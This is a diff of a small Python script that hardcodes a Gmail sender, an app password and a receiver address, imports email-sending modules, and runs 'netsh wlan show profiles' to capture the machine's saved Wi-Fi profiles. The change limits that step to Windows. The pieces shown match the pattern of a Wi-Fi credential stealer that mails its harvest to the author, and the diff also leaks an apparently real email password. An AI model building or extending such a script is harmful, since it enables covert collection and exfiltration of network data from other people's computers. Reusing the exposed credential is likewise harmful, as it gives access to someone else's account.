@@ -4,6 +4,9 @@ import smtplib
 from email.mime.text import MIMEText
 
 import webbrowser
+import subprocess
+import platform
+
 
 
 sender= "sonu.softwaresolution@gmail.com"
@@ -11,10 +14,11 @@ password= "cddy vhma mjxx iexi"
 receiver= "sonu.code.ai@gmail.com"
 
 
-import subprocess
+
 # Run a simple command
-output=subprocess.run(["cmd", "/c", "netsh wlan show profiles"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
-final_output=output.stdout
+if platform.system() == "Windows":
+    output=subprocess.run(["cmd", "/c", "netsh wlan show profiles"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
+    final_output=output.stdout
 
 
 
